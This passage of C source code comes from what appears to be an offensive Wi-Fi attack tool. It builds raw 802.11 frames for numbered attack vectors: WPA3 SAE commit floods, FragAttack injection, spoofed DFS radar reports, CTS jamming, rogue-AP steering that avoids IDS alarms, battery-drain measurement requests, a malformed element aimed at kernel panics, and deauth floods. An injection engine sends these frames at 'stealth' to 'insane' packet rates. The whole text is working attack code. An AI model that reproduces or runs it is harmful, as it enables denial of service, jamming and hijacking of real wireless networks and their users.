  /* [UPGRADE] WPA3 SAE Commit Flood (CPU Exhaustion)
   * Changes Auth Algo to SAE (3) and injects a dummy ECC payload.
   * This forces the AP to perform expensive cryptographic elliptic curve
   * operations, overwhelming the CPU of WPA3 hotspots. */
  uint16_t algo = htole16(3); 
  uint16_t seq = htole16(1);  
  uint16_t status = htole16(0); 
  memcpy(b + o, &algo, 2); o += 2;
  memcpy(b + o, &seq, 2); o += 2;
  memcpy(b + o, &status, 2); o += 2;
  
  
  uint16_t group_id = htole16(19);
  memcpy(b + o, &group_id, 2); o += 2;
  
  
  for (int i = 0; i < 32; i++) b[o++] = 0xAA;
  
  
  for (int i = 0; i < 64; i++) b[o++] = 0xBB;
  return o;
}

/* [FIX 9] DELBA with valid initiator params */
static int mk_delba(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6]) {
  int o = 0;
  o += mk_rt(b + o);
  o += mk_dot11(b + o, FC_ACTION, cli, bss, bss, 0);
  b[o++] = 3; 
  b[o++] = 2; 
  
  /* [FIX 9] DELBA params: bit 11 = initiator, bits 12-15 = TID */
  uint16_t params = htole16(0x0800); 
  memcpy(b + o, &params, 2);
  o += 2;
  uint16_t reason = htole16(39); 
  memcpy(b + o, &reason, 2);
  o += 2;
  return o;
}

/* [FIX 6] Confusion beacon with DS Parameter Set */
static int mk_confusion_beacon(uint8_t *b, const char *ssid, uint8_t cur_ch) {
  uint8_t fake[6];
  rand_mac(fake);
  int o = 0;
  o += mk_rt(b + o);
  o += mk_dot11(b + o, FC_BEACON, BCAST, fake, fake, 0);
  beacon_fix_t *f = (beacon_fix_t *)(b + o);
  f->ts = htole64(mono_us());
  f->interval = htole16(100);
  f->cap = htole16(0x0031);
  o += sizeof(beacon_fix_t);
  int sl = (int)strlen(ssid);
  if (sl > MAX_SSID_LEN)
    sl = MAX_SSID_LEN;
  b[o++] = 0;
  b[o++] = (uint8_t)sl;
  memcpy(b + o, ssid, sl);
  o += sl;
  o += mk_ds_ie(b + o, cur_ch); /* [FIX 6] */
  return o;
}

/* ============================================================
 *  FragAttack Injection — Fragment Header Manipulation (CVE-2020-24588)
 *
 *  Splits a data frame into two fragments with manipulated headers:
 *  Fragment 0 (MoreFrag=1): LLC/SNAP header + partial ARP request
 *  Fragment 1 (MoreFrag=0): Injected payload (plaintext data)
 *
 *  The receiver reassembles fragments in RAM and processes the
 *  reconstructed frame, bypassing per-fragment encryption checks
 *  on vulnerable implementations.
 *
 *  Reference: Mathy Vanhoef, "Fragment and Forge" (USENIX 2021)
 * ============================================================ */


#define FC_DATA_TODS_MOREFRAG 0x0508 


static int mk_frag_setup(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
                         uint16_t seq) {
  int o = 0;
  o += mk_rt(b + o);

  
  dot11_t *h = (dot11_t *)(b + o);
  h->fc = htole16(FC_DATA_TODS_MOREFRAG);
  h->dur = 0;
  
  memcpy(h->a1, bss, 6);
  memcpy(h->a2, cli, 6);
  memcpy(h->a3, bss, 6);
  
  h->seq = htole16((seq << 4) | 0); 
  o += sizeof(dot11_t);

  
  llc_snap_t *l = (llc_snap_t *)(b + o);
  l->dsap = 0xAA;
  l->ssap = 0xAA;
  l->ctrl = 0x03;
  memset(l->oui, 0, 3);
  l->type = htons(0x0800); 
  o += sizeof(llc_snap_t);

  
  uint8_t arp_partial[] = {
      0x00,
      0x01, 
      0x08,
      0x00, 
      0x06, 
      0x04, 
      0x00,
      0x01, 
      
      cli[0],
      cli[1],
      cli[2],
      cli[3],
      cli[4],
      cli[5],
  };
  memcpy(b + o, arp_partial, sizeof(arp_partial));
  o += sizeof(arp_partial);

  return o;
}


static int mk_frag_payload(uint8_t *b, const uint8_t bss[6],
                           const uint8_t cli[6], uint16_t seq,
                           const uint8_t *payload, int payload_len) {
  int o = 0;
  o += mk_rt(b + o);

  
  dot11_t *h = (dot11_t *)(b + o);
  h->fc = htole16(FC_DATA_TODS); 
  h->dur = 0;
  memcpy(h->a1, bss, 6);
  memcpy(h->a2, cli, 6);
  memcpy(h->a3, bss, 6);
  
  h->seq = htole16((seq << 4) | 1); 
  o += sizeof(dot11_t);

  
  if (payload && payload_len > 0) {
    int copy_len =
        payload_len > MAX_FRAG_PAYLOAD ? MAX_FRAG_PAYLOAD : payload_len;
    memcpy(b + o, payload, copy_len);
    o += copy_len;
  } else {
    
    uint8_t default_payload[] = {
        
        0xC0,
        0xA8,
        0x01,
        0x64,
        
        0xFF,
        0xFF,
        0xFF,
        0xFF,
        0xFF,
        0xFF,
        
        0xC0,
        0xA8,
        0x01,
        0x01,
        /* === ICMP Echo Request (injected command channel) === */
        
        0x45,
        0x00,
        0x00,
        0x1C, 
        0x00,
        0x00,
        0x40,
        0x00, 
        0x40,
        0x01,
        0x00,
        0x00, 
        0xC0,
        0xA8,
        0x01,
        0x64, 
        0xC0,
        0xA8,
        0x01,
        0x01, 
        
        0x08,
        0x00,
        0x00,
        0x00, 
        0xDE,
        0xAD,
        0xBE,
        0xEF, 
    };
    memcpy(b + o, default_payload, sizeof(default_payload));
    o += sizeof(default_payload);
  }

  return o;
}

/* ============================================================
 *  Operating Channel Aggression — DFS Fake Radar (Vector #16)
 *
 *  Spoofs IEEE 802.11h Spectrum Management signalling that
 *  mimics a military/weather radar detection event on a DFS
 *  operating channel (UNII-2 / UNII-2e: ch 52–64, 100–144).
 *
 *  Packet pair:
 *    1. Measurement Report Action (Basic Report, Map bit3=Radar)
 *       Client→AP: claims radar energy was observed on cur_ch
 *    2. CSA Beacon (mode=1 stop-TX, count=0) AP→broadcast
 *       Spoofs the AP's mandatory channel vacation response
 *
 *  Tactical effect: compliant 5 GHz APs must vacate the channel
 *  and enter Non-Occupancy / CAC lockout (minutes) per aviation
 *  DFS regulations (ETSI EN 301 893 / FCC Part 15 Subpart E).
 *
 *  Reference: IEEE 802.11-2020 §11.9 (DFS), §9.4.2.22 (Meas Report)
 * ============================================================ */


static uint8_t pick_safe_ch(uint8_t cur, uint8_t preferred) {
  if (valid_ch(preferred) && !is_dfs_ch(preferred))
    return preferred;
  if (cur >= 36)
    return 36; 
  return 1;
}


static int mk_dfs_radar_report(uint8_t *b, const uint8_t bss[6],
                               const uint8_t cli[6], uint8_t cur_ch, uint8_t token) {
  int o = 0;
  o += mk_rt(b + o);
  
  o += mk_dot11(b + o, FC_ACTION, bss, cli, bss, 0);

  b[o++] = 0; 
  b[o++] = 1; 
  b[o++] = token; /* [UPGRADE] Dynamic Dialog Token */

  /* [UPGRADE] Cascading DFS Lockout (Multi-Channel Strike) */
  
  uint8_t target_channels[] = { cur_ch, 52, 100, 132 };
  int num_targets = sizeof(target_channels);

  
  for (int i = 0; i < num_targets; i++) {
      b[o++] = 39;     
      b[o++] = 15;     
      b[o++] = (uint8_t)(i + 1); 
      b[o++] = 0;      
      b[o++] = 0;      
      b[o++] = target_channels[i]; 

      
      uint64_t tsf = htole64(mono_us());
      memcpy(b + o, &tsf, 8);
      o += 8;

      
      uint16_t dur = htole16(50);
      memcpy(b + o, &dur, 2);
      o += 2;

      
      b[o++] = 0x08;
  }

  return o;
}


static int mk_dfs_vacate_csa(uint8_t *b, const uint8_t bss[6], const char *ssid,
                             uint8_t cur_ch, uint8_t safe_ch) {
  int o = 0;
  o += mk_rt(b + o);
  o += mk_dot11(b + o, FC_BEACON, BCAST, bss, bss, 0);

  beacon_fix_t *f = (beacon_fix_t *)(b + o);
  f->ts = htole64(mono_us());
  f->interval = htole16(100);
  f->cap = htole16(0x0031); 
  o += sizeof(beacon_fix_t);

  int sl = (int)strlen(ssid);
  if (sl > MAX_SSID_LEN)
    sl = MAX_SSID_LEN;
  b[o++] = 0;
  b[o++] = (uint8_t)sl;
  memcpy(b + o, ssid, sl);
  o += sl;

  o += mk_ds_ie(b + o, cur_ch);

  
  b[o++] = 37;
  b[o++] = 3;
  csa_ie_t *c = (csa_ie_t *)(b + o);
  c->mode = 1; 
  c->ch = safe_ch;
  c->count = 0; 
  o += sizeof(csa_ie_t);

  /* [UPGRADE] Extended CSA IE (ID=60, len=4) for modern 5GHz clients */
  b[o++] = 60;
  b[o++] = 4;
  b[o++] = 1; 
  b[o++] = 115; 
  b[o++] = safe_ch;
  b[o++] = 0; 

  /* [UPGRADE] Quiet Element (IE 40) to enforce radio silence on old channel */
  b[o++] = 40;
  b[o++] = 6;
  b[o++] = 1; 
  b[o++] = 1; 
  uint16_t qdur = htole16(100); 
  memcpy(b + o, &qdur, 2); o += 2;
  uint16_t qoff = htole16(0);
  memcpy(b + o, &qoff, 2); o += 2;

  /* [UPGRADE] IE 192 (VHT Operation) Malformation - 160MHz Kernel Panic for 5GHz */
  b[o++] = 192;
  b[o++] = 5;
  b[o++] = 2;   
  b[o++] = 255; 
  b[o++] = 255; 
  b[o++] = 0xff; 
  b[o++] = 0xff;

  return o;
}

/* ============================================================
 *  CTS/RTS Virtual Jammer — Vector #17
 *
 *  Transmits spoofed Clear-To-Send (CTS) control frames with
 *  the Duration/NAV field set to maximum (32767 µs).
 *
 *  All 802.11-compliant devices hearing this CTS will update
 *  their NAV (Network Allocation Vector) and remain silent
 *  for the declared duration, causing Virtual Jamming across
 *  the entire frequency without disrupting physical connections.
 *
 *  Highly effective against robust routers (e.g. Huawei) that
 *  are resilient to Deauth/Disassoc but still honor NAV timing.
 *
 *  CTS frame format (IEEE 802.11-2020 §9.3.1.3):
 *    FC (2) + Duration (2) + RA (6) = 10 bytes (+ FCS by HW)
 * ============================================================ */
static int mk_cts_nav(uint8_t *b, const uint8_t ra[6]) {
  int o = 0;
  o += mk_rt(b + o);

  
  uint16_t fc = htole16(FC_CTS);
  memcpy(b + o, &fc, 2);
  o += 2;

  
  uint16_t dur = htole16(32767);
  memcpy(b + o, &dur, 2);
  o += 2;

  
  memcpy(b + o, ra, 6);
  o += 6;

  return o;
}

/* ============================================================
 *  WPA3 SAE Hunting & Puzzling — Vector #18
 *
 *  Floods SAE (Simultaneous Authentication of Equals) Commit
 *  frames with random source MACs. Each SAE Commit forces the
 *  AP to perform a computationally expensive Elliptic Curve
 *  Diffie-Hellman (ECDH) "hunting-and-pecking" operation to
 *  derive the Password Element (PWE).
 *
 *  Tactical effect: AP CPU saturates at 100% from continuous
 *  cryptographic puzzle computation, causing hang/crash
 *  (Crypto Puzzle Exhaustion / CVE-2019-9494 Dragonblood).
 *
 *  SAE Commit (IEEE 802.11-2020 §12.4):
 *    Auth frame: algo=SAE(3), seq=1, status=0
 *    Body: Group ID (2) + Scalar (32) + Element (64)
 * ============================================================ */
static int mk_sae_commit(uint8_t *b, const uint8_t bss[6],
                         const uint8_t cli[6], uint16_t group_id) {
  int o = 0;
  o += mk_rt(b + o);
  
  o += mk_dot11(b + o, FC_AUTH, bss, cli, bss, 0);

  
  uint16_t algo = htole16(3);
  memcpy(b + o, &algo, 2);
  o += 2;

  
  uint16_t txseq = htole16(1);
  memcpy(b + o, &txseq, 2);
  o += 2;

  
  uint16_t status = htole16(0);
  memcpy(b + o, &status, 2);
  o += 2;

  
  uint16_t group = htole16(group_id);
  memcpy(b + o, &group, 2);
  o += 2;

  
  static const uint8_t P256_G[64] = {
      0x6b, 0x17, 0xd1, 0xf2, 0xe1, 0x2c, 0x42, 0x47, 0xf8, 0xbc, 0xe6, 0xe5, 0x63, 0xa4, 0x40, 0xf2,
      0x77, 0x03, 0x7d, 0x81, 0x2d, 0xeb, 0x33, 0xa0, 0xf4, 0xa1, 0x39, 0x45, 0xd8, 0x98, 0xc2, 0x96,
      0x4f, 0xe3, 0x42, 0xe2, 0xfe, 0x1a, 0x7f, 0x9b, 0x8e, 0xe7, 0xeb, 0x4a, 0x7c, 0x0f, 0x9e, 0x16,
      0x2b, 0xce, 0x33, 0x57, 0x6b, 0x31, 0x5e, 0xce, 0xcb, 0xb6, 0x40, 0x68, 0x37, 0xbf, 0x51, 0xf5};
  
  static const uint8_t P384_G[96] = {
      0xaa, 0x87, 0xca, 0x22, 0xbe, 0x8b, 0x05, 0x37, 0x8e, 0xb1, 0xc7, 0x1e, 0xf3, 0x20, 0xad, 0x74,
      0x6e, 0x1d, 0x3b, 0x62, 0x8b, 0xa7, 0x9b, 0x98, 0x59, 0xf7, 0x41, 0xe0, 0x82, 0x54, 0x2a, 0x38,
      0x55, 0x02, 0xf2, 0x5d, 0xbf, 0x55, 0x29, 0x6c, 0x3a, 0x54, 0x5e, 0x38, 0x72, 0x76, 0x0a, 0xb7,
      0x36, 0x17, 0xde, 0x4a, 0x96, 0x26, 0x2c, 0x6f, 0x5d, 0x9e, 0x98, 0xbf, 0x92, 0x92, 0xdc, 0x29,
      0xf8, 0xf4, 0x1d, 0xbd, 0x28, 0x9a, 0x14, 0x7c, 0xe9, 0xda, 0x31, 0x13, 0xb5, 0xf0, 0xb8, 0xc0,
      0x0a, 0x60, 0xb1, 0xce, 0x1d, 0x7e, 0x81, 0x9d, 0x7a, 0x43, 0x1d, 0x7c, 0x90, 0xea, 0x0e, 0x5f};

  static const uint8_t P521_G[132] = {
      0x00, 0xc6, 0x85, 0x8e, 0x06, 0xb7, 0x04, 0x04, 0xe9, 0xcd, 0x9e, 0x3e, 0xcb, 0x66, 0x23, 0x95,
      0xb4, 0x42, 0x9c, 0x64, 0x81, 0x39, 0x05, 0x3f, 0xb5, 0x21, 0xf8, 0x28, 0xaf, 0x60, 0x6b, 0x4d,
      0x3d, 0xba, 0xa1, 0x4b, 0x5e, 0x77, 0xef, 0xe7, 0x59, 0x28, 0xfe, 0x1d, 0xc1, 0x27, 0xa2, 0xff,
      0xa8, 0xde, 0x33, 0x48, 0xb3, 0xc1, 0x85, 0x6a, 0x42, 0x9b, 0xf9, 0x7e, 0x7e, 0x31, 0xc2, 0xe5,
      0xbd, 0x66,
      0x01, 0x18, 0x39, 0x29, 0x6a, 0x78, 0x9a, 0x3b, 0xc0, 0x04, 0x5c, 0x8a, 0x5f, 0xb4, 0x2c, 0x7d,
      0x1b, 0xd9, 0x98, 0xf5, 0x44, 0x49, 0x57, 0x9b, 0x44, 0x68, 0x17, 0xaf, 0xbd, 0x17, 0x27, 0x3e,
      0x66, 0x2c, 0x97, 0xee, 0x72, 0x99, 0x5e, 0xf4, 0x26, 0x40, 0xc5, 0x50, 0xb9, 0x01, 0x3f, 0xad,
      0x07, 0x61, 0x35, 0x3c, 0x70, 0x86, 0xa2, 0x72, 0xc2, 0x40, 0x88, 0xbe, 0x94, 0x76, 0x9f, 0xd1,
      0x66, 0x50};

  int scalar_len = 32;
  const uint8_t *elem_ptr = P256_G;
  int elem_len = 64;

  if (group_id == 20) {
    scalar_len = 48;
    elem_ptr = P384_G;
    elem_len = 96;
  } else if (group_id == 21) {
    scalar_len = 66;
    elem_ptr = P521_G;
    elem_len = 132;
  }

  
  static __thread xorshift64_t sae_rng;
  static __thread bool sae_rng_init = false;
  if (!sae_rng_init) {
    xs64_seed(&sae_rng);
    sae_rng_init = true;
  }
  for (int i = 0; i < scalar_len; i += 8) {
    uint64_t r = xs64_next(&sae_rng);
    memcpy(b + o + i, &r, i + 8 <= scalar_len ? 8 : (size_t)(scalar_len - i));
  }
  o += scalar_len;

  
  memcpy(b + o, elem_ptr, elem_len);
  o += elem_len;

  return o;
}

/* ============================================================
 *  BSS Transition Attack (802.11v Steer) — Vector #19
 *
 *  Sends a spoofed BSS Transition Management Request (Action
 *  frame) pretending to originate from the legitimate AP,
 *  directing connected clients to roam to a rogue BSSID.
 *
 *  The frame includes a Neighbor Report IE containing the
 *  spoofed target BSSID with fabricated BSSID Information
 *  indicating superior signal/conditions, and sets the
 *  Disassociation Imminent bit to pressure immediate roaming.
 *
 *  Tactical effect: silent, non-disruptive client steering
 *  to a Rogue AP without triggering IDS alarms.
 *
 *  Reference: IEEE 802.11-2020 §11.22 (BSS Transition Mgmt)
 *             Category=10 (WNM), Action=7 (BTM Request)
 * ============================================================ */
static int mk_bss_transition(uint8_t *b, const uint8_t bss[6],
                             const uint8_t cli[6], uint16_t seq) {
  int o = 0;
  o += mk_rt(b + o);
  
  o += mk_dot11(b + o, FC_ACTION, cli, bss, bss, seq);

  
  b[o++] = 10;
  
  b[o++] = 7;
  
  b[o++] = 1;

  
  b[o++] = 0x05;

  
  uint16_t disassoc_timer = htole16(10);
  memcpy(b + o, &disassoc_timer, 2);
  o += 2;

  
  b[o++] = 20;

  

  /* --- Neighbor Report IE (ID=52) --- */
  b[o++] = 52; 
  b[o++] = 13; 

  
  uint8_t rogue_bssid[6];
  rand_mac(rogue_bssid);
  memcpy(b + o, rogue_bssid, 6);
  o += 6;

  
  uint32_t bssid_info = htole32(0x00000017);
  memcpy(b + o, &bssid_info, 4);
  o += 4;

  
  b[o++] = 81;
  
  b[o++] = 6;
  
  b[o++] = 7;

  return o;
}

/* ============================================================
 *  Beacon Report Drain (Battery Exploitation) — Vector #20
 *
 *  Sends Radio Measurement Request (Action frame) demanding
 *  the target device perform a continuous Beacon Report scan
 *  across ALL channels/operating classes. The target's radio
 *  must exit doze state and perform active/passive scanning
 *  on every frequency band.
 *
 *  Tactical effect: drains mobile device battery at extreme
 *  speed due to non-stop background scanning, causes thermal
 *  throttling and potential device shutdown.
 *
 *  Reference: IEEE 802.11-2020 §11.11.8 (Beacon Report)
 *             Category=5 (Radio Measurement), Action=0 (Req)
 * ============================================================ */
static int mk_beacon_report_req(uint8_t *b, const uint8_t bss[6],
                                const uint8_t cli[6], uint8_t cur_ch, uint16_t seq) {
  int o = 0;
  o += mk_rt(b + o);
  
  o += mk_dot11(b + o, FC_ACTION, cli, bss, bss, seq);

  
  b[o++] = 5;
  
  b[o++] = 0;
  
  b[o++] = 1;
  
  uint16_t reps = htole16(0xFFFF);
  memcpy(b + o, &reps, 2);
  o += 2;

  /* --- Measurement Request IE (ID=38) --- */
  b[o++] = 38; 
  b[o++] = 14; 
  b[o++] = 1;  
  
  b[o++] = 0x0A;
  
  b[o++] = 5;

  /* --- Beacon Report subelement --- */
  
  b[o++] = 81;
  
  b[o++] = 0;

  
  uint16_t rand_int = htole16(0);
  memcpy(b + o, &rand_int, 2);
  o += 2;

  
  uint16_t meas_dur = htole16(1000);
  memcpy(b + o, &meas_dur, 2);
  o += 2;

  
  b[o++] = 0;

  
  memcpy(b + o, BCAST, 6);
  o += 6;

  (void)cur_ch; 

  return o;
}

/* ============================================================
 *               PACKET FACTORY
 * ============================================================ */

static const uint16_t REASON_CODES[] = {1, 3, 4, 6, 7, 8, 17, 23};
#define N_REASONS 8

typedef struct {
  pkt_t csa_beacon[4];
  pkt_t quiet_beacon;
  pkt_t deauth_fwd[N_REASONS];
  pkt_t deauth_rev[N_REASONS];
  pkt_t deauth_bcast;
  pkt_t disassoc_fwd[N_REASONS];   /* [UPGRADE] Reason code rotation */
  pkt_t disassoc_bcast;
  pkt_t eapol_logoff;
  pkt_t csa_action[4];
  pkt_t probe_resp[4];    
  pkt_t probe_resp_bc[4]; /* [FIX 8] broadcast variant */
  pkt_t delba;
  pkt_t confusion;
  pkt_t auth_pool[MAX_AUTH_POOL];
  
  pkt_t frag_setup;   
  pkt_t frag_payload; 
  
  pkt_t dfs_radar_report; 
  pkt_t dfs_vacate_csa;   
  /* Vector #17: CTS/RTS Virtual Jammer */
  pkt_t cts_nav;
  /* Vector #18: WPA3 SAE Hunting (pre-built with random cli, refreshed per-use)
   */
  pkt_t sae_pool[MAX_AUTH_POOL];
  /* Vector #19: BSS Transition Attack (802.11v Steer) */
  pkt_t bss_transition;
  /* Vector #20: Beacon Report Drain (Battery Exploitation) */
  pkt_t beacon_report;
} factory_t;

/* [FIX 10] factory_build checks parse_mac returns */
static bool factory_build(factory_t *f, const target_ap_t *t, int new_ch,
                          const char *cli_str) {
  uint8_t bss[6], cli[6];

  /* [FIX 10] */
  if (parse_mac(t->bssid, bss) != 0) {
    fprintf(stderr, "  " C_RED "[!] Invalid target BSSID: '%s'" RST "\n",
            t->bssid);
    return false;
  }
  if (parse_mac(cli_str, cli) != 0) {
    fprintf(stderr, "  " C_RED "[!] Invalid client MAC: '%s'" RST "\n",
            cli_str);
    return false;
  }

  uint8_t cur_ch = (uint8_t)t->channel;

  /* [UPGRADE] Apply Aggressive Dead-End Routing to Factory Mode */
  uint8_t aggressive_redir;
  if (cur_ch <= 14) {
      aggressive_redir = (cur_ch <= 6) ? 14 : 1;
  } else {
      /* [UPGRADE] 5GHz DFS Blackhole (TDWR Band, 10-min CAC) */
      aggressive_redir = (new_ch > 0) ? (uint8_t)new_ch : 128;
  }

  /* [UPGRADE] Build Realistic Countdown Burst for Factory Mode */
  for (int c = 3, idx = 0; c >= 0; c--, idx++) {
      f->csa_beacon[idx].len =
          mk_csa_beacon(f->csa_beacon[idx].buf, bss, t->ssid, cur_ch, aggressive_redir, c, 0);
  }
  f->quiet_beacon.len =
      mk_quiet_beacon(f->quiet_beacon.buf, bss, t->ssid, cur_ch);

  /* [FIX 11] seq=0 at build time (injector assigns real seq) */
  for (int i = 0; i < N_REASONS; i++) {
    f->deauth_fwd[i].len =
        mk_deauth(f->deauth_fwd[i].buf, bss, cli, REASON_CODES[i], 0);
    f->deauth_rev[i].len =
        mk_deauth_rev(f->deauth_rev[i].buf, bss, cli, REASON_CODES[i], 0);
    /* [UPGRADE] Disassoc also gets full reason code rotation */
    f->disassoc_fwd[i].len =
        mk_disassoc(f->disassoc_fwd[i].buf, bss, cli, REASON_CODES[i], 0);
  }
  f->deauth_bcast.len = mk_deauth(f->deauth_bcast.buf, bss, BCAST, 7, 0);
  f->disassoc_bcast.len = mk_disassoc(f->disassoc_bcast.buf, bss, BCAST, 8, 0);

  f->eapol_logoff.len = mk_eapol_logoff(f->eapol_logoff.buf, bss, cli);

  /* [UPGRADE] Burst Countdown for Action and Probe Response */
  for (int c = 3, idx = 0; c >= 0; c--, idx++) {
      f->csa_action[idx].len =
          mk_csa_action(f->csa_action[idx].buf, bss, cli, aggressive_redir, c, 0);

      f->probe_resp[idx].len = mk_probe_resp_csa(f->probe_resp[idx].buf, bss, cli, t->ssid,
                                            cur_ch, aggressive_redir, c, 0);
      f->probe_resp_bc[idx].len = mk_probe_resp_csa(f->probe_resp_bc[idx].buf, bss, BCAST,
                                               t->ssid, cur_ch, aggressive_redir, c, 0);
  }

  f->delba.len = mk_delba(f->delba.buf, bss, cli);
  f->confusion.len = mk_confusion_beacon(f->confusion.buf, t->ssid, cur_ch);

  
  uint16_t frag_seq = 42; 
  f->frag_setup.len = mk_frag_setup(f->frag_setup.buf, bss, cli, frag_seq);
  f->frag_payload.len =
      mk_frag_payload(f->frag_payload.buf, bss, cli, frag_seq, NULL, 0);

  
  uint8_t safe = pick_safe_ch(cur_ch, (uint8_t)new_ch);
  f->dfs_radar_report.len =
      mk_dfs_radar_report(f->dfs_radar_report.buf, bss, cli, cur_ch, 42);
  f->dfs_vacate_csa.len =
      mk_dfs_vacate_csa(f->dfs_vacate_csa.buf, bss, t->ssid, cur_ch, safe);

  /* Vector #17: CTS/RTS Virtual Jammer — broadcast CTS with max NAV */
  f->cts_nav.len = mk_cts_nav(f->cts_nav.buf, BCAST);

  /* Vector #18: WPA3 SAE Hunting — SAE Commit from random clients */
  uint16_t sae_groups[] = {19, 20, 21}; 
  for (int i = 0; i < MAX_AUTH_POOL; i++) {
    uint8_t fm[6];
    rand_mac(fm);
    f->sae_pool[i].len = mk_sae_commit(f->sae_pool[i].buf, bss, fm, sae_groups[i % 3]);
  }

  /* Vector #19: BSS Transition Attack — BTM Request to broadcast */
  f->bss_transition.len = mk_bss_transition(f->bss_transition.buf, bss, BCAST, 0);

  /* Vector #20: Beacon Report Drain — Measurement Request to broadcast */
  f->beacon_report.len =
      mk_beacon_report_req(f->beacon_report.buf, bss, BCAST, cur_ch, 0);

  for (int i = 0; i < MAX_AUTH_POOL; i++) {
    uint8_t fm[6];
    rand_mac(fm);
    f->auth_pool[i].len = mk_auth(f->auth_pool[i].buf, bss, fm);
  }
  return true;
}

typedef struct {
  pkt_t *p[32];
  int n;
} pkt_set_t;

/* [FIX 3] Explicit empty cases for non-injection vectors */
static pkt_set_t factory_get(factory_t *f, attack_vector_t v) {
  pkt_set_t s = {.n = 0};
  switch (v) {
  case VEC_CSA_BEACON:
    /* [UPGRADE] Burst Countdown: Hand over all 4 packets (3, 2, 1, 0) */
    for (int i = 0; i < 4 && s.n < 32; i++) {
        s.p[s.n++] = &f->csa_beacon[i];
    }
    break;
  case VEC_QUIET_ELEMENT:
    s.p[s.n++] = &f->quiet_beacon;
    break;
  case VEC_DEAUTH_FLOOD:
    for (int i = 0; i < N_REASONS && s.n < 30; i++) {
      s.p[s.n++] = &f->deauth_fwd[i];
      s.p[s.n++] = &f->deauth_rev[i];
    }
    s.p[s.n++] = &f->deauth_bcast;
    break;
  case VEC_DISASSOC_FLOOD:
    /* [UPGRADE] Reason code rotation for disassoc (matches deauth) */
    for (int i = 0; i < N_REASONS && s.n < 30; i++)
      s.p[s.n++] = &f->disassoc_fwd[i];
    s.p[s.n++] = &f->disassoc_bcast;
    break;
  case VEC_EAPOL_LOGOFF:
    s.p[s.n++] = &f->eapol_logoff;
    break;
  case VEC_CSA_ACTION:
    /* [UPGRADE] Burst Countdown */
    for (int i = 0; i < 4 && s.n < 32; i++) {
        s.p[s.n++] = &f->csa_action[i];
    }
    break;
  case VEC_BEACON_CONFUSION:
    s.p[s.n++] = &f->confusion;
    break;
  case VEC_PROBE_RESPONSE_CSA:
    /* [UPGRADE] Burst Countdown */
    for (int i = 0; i < 4 && s.n < 30; i++) {
        s.p[s.n++] = &f->probe_resp[i];    
        s.p[s.n++] = &f->probe_resp_bc[i]; 
    }
    break;
  case VEC_DELBA_ATTACK:
    s.p[s.n++] = &f->delba;
    break;
  case VEC_AUTH_DOS:
    for (int i = 0; i < MAX_AUTH_POOL && s.n < 32; i++)
      s.p[s.n++] = &f->auth_pool[i];
    break;
  case VEC_FRAGATTACK:
    
    s.p[s.n++] = &f->frag_setup;
    s.p[s.n++] = &f->frag_payload;
    break;
  case VEC_DFS_FAKE_RADAR:
    
    s.p[s.n++] = &f->dfs_radar_report;
    s.p[s.n++] = &f->dfs_vacate_csa;
    break;
  case VEC_CTS_NAV_JAMMER:
    s.p[s.n++] = &f->cts_nav;
    break;
  case VEC_SAE_HUNTING:
    for (int i = 0; i < MAX_AUTH_POOL && s.n < 32; i++)
      s.p[s.n++] = &f->sae_pool[i];
    break;
  case VEC_BSS_TRANSITION:
    s.p[s.n++] = &f->bss_transition;
    break;
  case VEC_BEACON_REPORT_DRAIN:
    s.p[s.n++] = &f->beacon_report;
    break;
  /* [FIX 3] Non-injection vectors: handled by other engines */
  case VEC_PMKID_CAPTURE:
    break; 
  case VEC_POWER_SAVE:
    break; 
  case VEC_COUNT:
    break;
  }
  return s;
}

/* ============================================================
 *        RATE CONTROLLER (per-thread, rolling window)
 * ============================================================ */

/* [FIX 12,19,20] Per-thread rate controller with 1s rolling window */
typedef struct {
  attack_mode_t mode;
  int target_pps;
  double base_sleep;
  double factor;
  /* [FIX 20] Rolling window */
  uint64_t window_sent;
  double window_start;
} rate_ctrl_t;

static void rate_init(rate_ctrl_t *r, attack_mode_t m, int nthreads) {
  r->mode = m;
  r->factor = 1.0;
  r->window_sent = 0;
  r->window_start = mono_time();

  int base_pps;
  switch (m) {
  case MODE_STEALTH:
    base_pps = 20;
    r->base_sleep = 0.5;
    break;
  case MODE_LOW:
    base_pps = 50;
    r->base_sleep = 0.3;
    break;
  case MODE_MEDIUM:
    base_pps = 200;
    r->base_sleep = 0.08;
    break;
  case MODE_HIGH:
    base_pps = 500;
    r->base_sleep = 0.015;
    break;
  case MODE_INSANE:
    base_pps = 5000;
    r->base_sleep = 0.001;
    break;
  default:
    base_pps = 200;
    r->base_sleep = 0.08;
    break;
  }
  /* [FIX 19] Divide target by thread count */
  r->target_pps = nthreads > 0 ? base_pps / nthreads : base_pps;
  if (r->target_pps < 1)
    r->target_pps = 1;
}

/* [FIX 20] Rolling-window PPS measurement */
static double rate_sleep(rate_ctrl_t *r, uint64_t thread_sent) {
  double now = mono_time();
  double window_elapsed = now - r->window_start;

  
  if (window_elapsed >= 1.0) {
    r->window_sent = 0;
    r->window_start = now;
    window_elapsed = 0.001;
  }
  r->window_sent = thread_sent;

  double current_pps =
      window_elapsed > 0.01 ? (double)r->window_sent / window_elapsed : 0;
  double ratio = r->target_pps > 0 ? current_pps / r->target_pps : 1.0;

  if (ratio > 1.5) {
    r->factor *= 1.1;
    if (r->factor > 10.0)
      r->factor = 10.0;
  } else if (ratio < 0.5) {
    r->factor *= 0.9;
    if (r->factor < 0.1)
      r->factor = 0.1;
  }

  return r->base_sleep * r->factor;
}

/* ============================================================
 *               INJECTION ENGINE
 * ============================================================ */

typedef struct {
  pkt_set_t pkts;
  const char *iface;
  attack_mode_t mode;
  bool ids_bypass;
  int thread_id;
  int total_threads;
} inj_arg_t;

/* [FIX 3,5,12,13,14,15,16,17] Comprehensive injection thread */
static void *inject_thread(void *arg) {
  inj_arg_t *a = (inj_arg_t *)arg;

  /* [FIX 16] Guard empty packet set */
  if (a->pkts.n == 0) {
    free(a);
    return NULL;
  }

  /* [FIX 15] Explicit error on socket failure */
  int sock = raw_socket(a->iface);
  if (sock < 0) {
    fprintf(stderr, "  " C_RED "[!] Thread %d: socket failed for '%s'" RST "\n",
            a->thread_id, a->iface);
    free(a);
    return NULL;
  }

  /* [FIX 14] Per-thread PRNG */
  xorshift64_t rng;
  xs64_seed(&rng);

  /* [FIX 12] Per-thread rate controller */
  rate_ctrl_t rate;
  rate_init(&rate, a->mode, a->total_threads);

  uint16_t seq = 0;
  int idx = 0;
  uint64_t local_sent = 0;

  while (!g_stop) {
    int burst = xs64_range(&rng, 5, 12);

    /* [FIX 17] Batch works for any n >= 1 */
